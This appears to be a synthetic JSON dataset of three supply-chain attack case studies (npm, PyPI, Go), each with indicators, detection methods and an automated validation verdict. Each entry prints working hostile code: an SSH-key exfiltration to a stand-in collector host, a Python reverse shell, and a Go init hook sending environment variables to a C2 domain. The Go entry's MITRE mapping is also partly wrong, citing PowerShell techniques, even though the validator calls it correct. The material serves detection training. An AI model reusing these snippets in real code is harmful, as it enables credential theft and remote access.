@@ -1,0 +1,213 @@
+{
+  "report": [
+    {
+      "index": 0,
+      "problem": {
+        "area": "Supply Chain Attack",
+        "nature": "software_dependency_compromise"
+      },
+      "example": {
+        "scenario": "Malicious code injection into a popular JavaScript utility library hosted on npm, causing downstream applications to execute unauthorized network requests and data exfiltration.",
+        "technical_data": {
+          "package_info": {
+            "name": "fast-utils",
+            "version": "2.4.1",
+            "repository": "https://registry.npmjs.org/fast-utils/-/fast-utils-2.4.1.tgz",
+            "integrity": "sha512-3e8FZ3k5p7nHf9q9BZb3g8EtY0E8XkQ2zHjK8Ep3c+v53cN9tD9Yw7X9KJj1+5k+Yp5Qj9k+9hWQ5r9L7zJ9xg=="
+          },
+          "malicious_code_snippet": "src/index.js",
+          "code_diff": "+\n+const https = require('https');\n+const fs = require('fs');\n+\n+function exfiltrateData() {\n+  const secretFile = '/root/.ssh/id_rsa';\n+  fs.readFile(secretFile, 'utf8', (err, data) => {\n+    if (!err) {\n+      const options = {\n+        hostname: 'malicious-collector.example.com',\n+        port: 443,\n+        path: '/collect',\n+        method: 'POST',\n+        headers: {\n+          'Content-Type': 'application/json'\n+        }\n+      };\n+      const req = https.request(options, (res) => {\n+        // no-op\n+      });\n+      req.write(JSON.stringify({key: data}));\n+      req.end();\n+    }\n+  });\n+}\n+\n+exfiltrateData();\n",
+          "npm_registry_logs": [
+            "2024-05-15T14:22:10Z INFO package fast-utils version 2.4.1 published by user 'dev_john'",
+            "2024-05-15T14:22:15Z WARN package fast-utils version 2.4.1 integrity hash mismatch detected from IP 203.0.113.45",
+            "2024-05-15T14:22:20Z INFO package fast-utils version 2.4.1 downloaded 15000 times in last hour"
+          ],
+          "dependency_scanner_output": {
+            "tool": "Snyk",
+            "scan_date": "2024-05-16T10:00:00Z",
+            "vulnerabilities_found": [
+              {
+                "package": "fast-utils",
+                "version": "2.4.1",
+                "issue": "Malicious code detected that exfiltrates private SSH keys via HTTPS POST.",
+                "severity": "critical",
+                "location": "src/index.js",
+                "remediation": "Pin dependency to 2.4.0 or earlier; notify vendor."
+              }
+            ]
+          },
+          "network_traffic_sample": [
+            "FRAME 1: 74 bytes on wire (592 bits), 74 bytes captured (592 bits)",
+            "Ethernet II, Src: 02:42:ac:11:00:02, Dst: 52:54:00:12:35:02",
+            "Internet Protocol Version 4, Src: 10.0.0.5, Dst: 198.51.100.23",
+            "Transmission Control Protocol, Src Port: 56789, Dst Port: 443, Seq: 1, Ack: 1, Len: 18",
+            "Secure Sockets Layer",
+            "POST /collect HTTP/1.1",
+            "Host: malicious-collector.example.com",
+            "User-Agent: node-fetch/1.0 (+https://github.com/bitinn/node-fetch)",
+            "Content-Type: application/json",
+            "Content-Length: 162",
+            "",
+            "{\"key\":\"-----BEGIN OPENSSH PRIVATE KEY-----\\n...exfiltrated data...\\n-----END OPENSSH PRIVATE KEY-----\"}"
+          ]
+        },
+        "indicators": {
+          "ioc_domains": [
+            "malicious-collector.example.com"
+          ],
+          "ioc_ips": [
+            "198.51.100.23"
+          ],
+          "file_hashes": {
+            "fast-utils-2.4.1.tgz": {
+              "sha256": "b8aeb3f1e1c5e4a2c8e3c1f7b4d2e8a9f5d6c7b8a9e0f1c2d3b4a5f6e7d8c9b0"
+            }
+          },
+          "npm_user": "dev_john",
+          "suspicious_code_patterns": [
+            "fs.readFile\\(.*id_rsa.*\\)",
+            "https.request\\("
+          ]
+        },
+        "detection_method": "Automated dependency scanning tools (e.g., Snyk, Dependabot) flagged newly published version containing suspicious network requests combined with manual code review identifying unexpected fs.readFile calls on sensitive files; network monitoring alerted on anomalous HTTPS POSTs to unknown external domains from build servers.",
+        "relevant_mitre_techniques": [
+          "T1195.003 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+          "T1071.001 - Application Layer Protocol: Web Protocols",
+          "T1041 - Exfiltration Over C2 Channel",
+          "T1110 - Brute Force (if attacker gained npm publishing credentials)"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a software dependency compromise within the supply chain attack domain. The scenario clearly describes malicious code injection into a popular npm package, aligning well with the problem nature. The technical data is comprehensive and realistic, including package metadata, a detailed malicious code snippet, npm registry logs showing integrity hash mismatch, dependency scanner output identifying the malicious code, and network traffic samples evidencing data exfiltration. Indicators such as IOC domains, IPs, file hashes, suspicious code patterns, and npm user are well documented and relevant. The detection method combines automated scanning, manual code review, and network monitoring, which is a practical multi-layered approach. Relevant MITRE ATT&CK techniques are correctly identified and appropriate. Overall, the sample is complete, plausible, and well-structured, effectively illustrating the risk and detection of software dependency compromise in a supply chain attack."
+      }
+    },
+    {
+      "index": 1,
+      "problem": {
+        "area": "Supply Chain Attack",
+        "nature": "software_dependency_compromise"
+      },
+      "example": {
+        "scenario": "Attackers compromised a widely used Python package on PyPI by injecting obfuscated malicious code that creates a reverse shell connection to attacker infrastructure, affecting all downstream projects that install or update the package.",
+        "technical_data": {
+          "package_metadata": {
+            "name": "data-cleaner",
+            "version": "1.2.7",
+            "upload_time": "2024-04-20T09:30:00Z",
+            "publisher": "trusted_dev42",
+            "hash_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+          },
+          "malicious_code": "data_cleaner/__init__.py",
+          "malicious_code_sample": "import socket,subprocess,os\n\nHOST = '198.51.100.45'\nPORT = 4444\n\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((HOST,PORT))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nimport pty\npty.spawn('/bin/sh')\n",
+          "obfuscation": "Base64 encoded payload in __init__.py with runtime decoding and execution via exec()",
+          "PyPI_upload_logs": [
+            "2024-04-20 09:29:55 INFO Uploading data-cleaner-1.2.7.tar.gz by user 'trusted_dev42' from IP 198.51.100.78",
+            "2024-04-20 09:30:05 WARN Package hash mismatch detected during upload",
+            "2024-04-20 09:31:00 INFO Package data-cleaner-1.2.7 download count increased by 25000 in last 1 hour"
+          ],
+          "pip_install_log": "[INFO] Installing collected packages: data-cleaner\n[INFO] Running setup.py install for data-cleaner ... done\n[INFO] Successfully installed data-cleaner-1.2.7\n",
+          "network_logs": [
+            "2024-04-21T02:15:23Z ALERT TCP connection initiated from internal_host: random_port -> 198.51.100.45:4444",
+            "2024-04-21T02:15:25Z INFO Reverse shell established from internal_host to 198.51.100.45",
+            "2024-04-21T02:16:00Z COMMAND EXEC: whoami",
+            "2024-04-21T02:16:02Z RESPONSE: root"
+          ]
+        },
+        "indicators": {
+          "ioc_c2_ip": "198.51.100.45",
+          "ioc_publisher": "trusted_dev42",
+          "file_hashes": {
+            "data-cleaner-1.2.7.tar.gz": {
+              "sha256": "a7b3f1e4c9d8a2b3e4f5d6c7b8a9e0f1c2d3b4a5f6e7d8c9b0e1f2a3b4c5d6e7"
+            }
+          },
+          "suspicious_code_patterns": [
+            "socket.socket",
+            "pty.spawn",
+            "os.dup2",
+            "exec\\(base64.b64decode"
+          ],
+          "base64_payload_sample": "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCg=="
+        },
+        "detection_method": "Static code analysis combined with SBOM comparison flagged unexpected network socket usage; runtime monitoring detected outbound TCP connections on uncommon ports; network IDS triggered on non-standard internal host connections to external IP 198.51.100.45 port 4444; anomaly detection in PyPI upload logs revealed hash mismatches and suspicious publisher activity.",
+        "relevant_mitre_techniques": [
+          "T1195.003 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+          "T1059.004 - Command and Scripting Interpreter: Python",
+          "T1105 - Ingress Tool Transfer",
+          "T1071.001 - Application Layer Protocol: Web Protocols",
+          "T1219 - Remote Access Software"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a software dependency compromise within the supply chain attack domain. The scenario clearly describes the injection of obfuscated malicious code into a widely used Python package on PyPI, which aligns perfectly with the problem nature. The technical data is detailed and realistic, including package metadata, obfuscated malicious code, upload logs showing hash mismatches, installation logs, and network logs evidencing reverse shell activity. Indicators such as C2 IP, suspicious code patterns, and file hashes are well documented and support the detection narrative. The detection methods described incorporate SBOM comparison, static code analysis, runtime monitoring, and anomaly detection in upload logs, which are appropriate risk reduction strategies. Relevant MITRE ATT&CK techniques are correctly identified and relevant to the attack scenario. Overall, the sample is complete, plausible, and provides clear indicators explaining why it matches the problem. No missing fields or inconsistencies were found."
+      }
+    },
+    {
+      "index": 2,
+      "problem": {
+        "area": "Supply Chain Attack",
+        "nature": "software_dependency_compromise"
+      },
+      "example": {
+        "scenario": "A malicious actor injected a trojanized version of a Go module into the public Go module proxy, which upon import executes code that collects environment variables and sends them over an unencrypted HTTP request to a command and control server.",
+        "technical_data": {
+          "module_info": {
+            "module_name": "github.com/legit-dev/logger",
+            "version": "v1.3.5",
+            "go_proxy_url": "https://proxy.golang.org/github.com/legit-dev/logger/@v/v1.3.5.zip",
+            "sha256": "d2b2c3a7e9f8b7c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1"
+          },
+          "trojanized_code_snippet": "logger/logger.go",
+          "trojanized_code": "package logger\n\nimport (\n    \"net/http\"\n    \"os\"\n    \"strings\"\n    \"time\"\n)\n\nfunc init() {\n    go func() {\n        client := &http.Client{Timeout: 5 * time.Second}\n        env := os.Environ()\n        data := strings.Join(env, \";\")\n        req, _ := http.NewRequest(\"POST\", \"http://malicious-c2.example.net/collect\", strings.NewReader(data))\n        req.Header.Set(\"Content-Type\", \"text/plain\")\n        client.Do(req)\n    }()\n}\n",
+          "go_proxy_log": [
+            "2024-03-10T11:05:23Z INFO module github.com/legit-dev/logger v1.3.5 requested by user 'ci-bot-007'",
+            "2024-03-10T11:05:25Z WARN checksum database mismatch for module github.com/legit-dev/logger v1.3.5",
+            "2024-03-10T11:06:00Z INFO module github.com/legit-dev/logger v1.3.5 downloaded 12000 times in last 24h"
+          ],
+          "environment_collection_payload_sample": "PATH=/usr/local/bin:/usr/bin;HOME=/home/user;GOPATH=/go;SECRET_TOKEN=abc123",
+          "http_traffic": [
+            "POST /collect HTTP/1.1",
+            "Host: malicious-c2.example.net",
+            "Content-Type: text/plain",
+            "Content-Length: 92",
+            "",
+            "PATH=/usr/local/bin:/usr/bin;HOME=/home/user;GOPATH=/go;SECRET_TOKEN=abc123"
+          ],
+          "gomod_checksum_mismatch_log": "2024-03-10 11:05:25 checksum mismatch: expected 0xabc123 but got 0xdef456 for github.com/legit-dev/logger v1.3.5"
+        },
+        "indicators": {
+          "ioc_c2_domain": "malicious-c2.example.net",
+          "ioc_module": "github.com/legit-dev/logger",
+          "ioc_version": "v1.3.5",
+          "file_hashes": {
+            "v1.3.5.zip": "d2b2c3a7e9f8b7c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1"
+          },
+          "suspicious_code_patterns": [
+            "os.Environ",
+            "http.NewRequest",
+            "go func",
+            "client.Do"
+          ],
+          "checksum_mismatch": true
+        },
+        "detection_method": "Checksum verification failures in Go module proxy logs prompted manual investigation; static code analysis of module revealed network transmission of environment data in init(); network monitoring detected HTTP POST requests to suspicious external domain; SBOM mismatches raised alerts during CI pipeline dependency validation.",
+        "relevant_mitre_techniques": [
+          "T1195.003 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+          "T1071.001 - Application Layer Protocol: Web Protocols",
+          "T1059.001 - Command and Scripting Interpreter: PowerShell (conceptually similar to Go init hook usage)",
+          "T1086 - PowerShell (conceptual similarity with runtime code execution)",
+          "T1041 - Exfiltration Over C2 Channel"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a software dependency compromise within a supply chain attack context. The scenario describes injection of malicious code into a widely used Go module, which aligns well with the problem nature. The technical data is detailed and realistic, including module metadata, code snippet demonstrating malicious behavior, proxy logs showing checksum mismatches, and network traffic evidencing data exfiltration. Indicators clearly highlight relevant IoCs such as the malicious C2 domain, module name and version, file hashes, suspicious code patterns, and checksum mismatch flag, all supporting the detection of the compromise. The detection method comprehensively covers multiple layers of defense including checksum verification, static code analysis, network monitoring, and SBOM validation, which aligns with recommended risk reduction strategies. The inclusion of relevant MITRE ATT&CK techniques further strengthens the sample's completeness and contextual relevance. Overall, the sample is well-constructed, plausible, and complete, providing a strong example of a software dependency compromise supply chain attack."
+      }
+    }
+  ]
+}
